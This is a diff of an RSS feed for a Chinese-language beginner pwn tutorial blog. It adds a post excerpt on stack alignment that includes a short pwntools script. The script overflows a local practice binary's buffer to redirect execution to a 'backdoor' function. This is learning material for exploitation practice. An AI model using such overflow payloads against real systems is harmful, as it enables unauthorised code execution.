@@ -1,4 +1,41 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>lhon901's blog</title><link>/</link><description>Recent content on lhon901's blog</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Mon, 23 Jun 2025 20:00:37 +0800</lastBuildDate><atom:link href="/rss.xml" rel="self" type="application/rss+xml"/><item><title>从零开始的 Pwn 之旅 - 栈溢出初识</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%9D%E8%AF%86/</link><pubDate>Mon, 23 Jun 2025 18:30:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%9D%E8%AF%86/</guid><description>&lt;h2 id="前言">前言
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>lhon901's blog</title><link>/</link><description>Recent content on lhon901's blog</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Tue, 24 Jun 2025 13:00:37 +0800</lastBuildDate><atom:link href="/rss.xml" rel="self" type="application/rss+xml"/><item><title>从零开始的 Pwn 之旅 - 栈对齐</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E5%AF%B9%E9%BD%90/</link><pubDate>Tue, 24 Jun 2025 12:37:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E5%AF%B9%E9%BD%90/</guid><description>&lt;h2 id="前言">前言
+&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
+&lt;/h2>&lt;p>在上一节中为了成功执行 payload，我们在 exp.py 中加入了 &lt;code>ret&lt;/code> 指令，今天我们将继续深入了解栈对齐的问题。&lt;/p>
+&lt;h2 id="栈对齐">栈对齐
+&lt;a class="header-anchor" href="#%e6%a0%88%e5%af%b9%e9%bd%90">&lt;/a>
+&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1"> 1&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2"> 2&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3"> 3&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4"> 4&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5"> 5&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6"> 6&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7"> 7&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-8">&lt;a class="lnlinks" href="#hl-0-8"> 8&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-9">&lt;a class="lnlinks" href="#hl-0-9"> 9&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-10">&lt;a class="lnlinks" href="#hl-0-10">10&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-11">&lt;a class="lnlinks" href="#hl-0-11">11&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-12">&lt;a class="lnlinks" href="#hl-0-12">12&lt;/a>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./main&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 启动程序&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">backdoor&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x401170&lt;/span> &lt;span class="c1"># backdoor 函数的地址&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 0x000000000040101a : ret&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x40101a&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;a&amp;#34;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mh">0x10&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">backdoor&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 填充到 0x10 字节 + 8 字节的返回地址&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 发送 payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># 进入交互模式&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+
+&lt;p>开始调试后一直跟踪到发现卡住无法调试了&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - 栈溢出初识</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%9D%E8%AF%86/</link><pubDate>Mon, 23 Jun 2025 18:30:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%9D%E8%AF%86/</guid><description>&lt;h2 id="前言">前言
 &lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
 &lt;/h2>&lt;p>为什么输入一串杂乱的字符串，就能让程序崩溃？为什么输入一串特定的字符串，就能让程序执行任意代码？下面的内容将带你走进 Pwn 的世界，了解栈溢出是如何发生的，以及如何利用它来执行任意代码。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Pwn 环境的搭建</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pwn-%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/</link><pubDate>Mon, 23 Jun 2025 18:15:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pwn-%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/</guid><description>&lt;h2 id="静态代码分析">静态代码分析
 &lt;a class="header-anchor" href="#%e9%9d%99%e6%80%81%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90">&lt;/a>
